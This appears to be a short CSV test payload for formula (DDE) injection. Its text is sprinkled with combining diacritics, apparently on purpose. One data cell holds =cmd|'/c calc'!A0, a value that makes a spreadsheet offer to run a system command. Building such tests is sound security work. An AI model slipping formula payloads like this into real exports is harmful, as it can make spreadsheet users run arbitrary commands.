**WARNING: Th̀is payload tests CSV/F̂ormúla polyglot.**

name,v́̃alue,noteś̀̂
Alic̨̃e,100,"Noŕ̃mal data"
=cmd|'/c calc'!A0,200,"CSV i̧njëc̊̊̀t̃̂iòn"
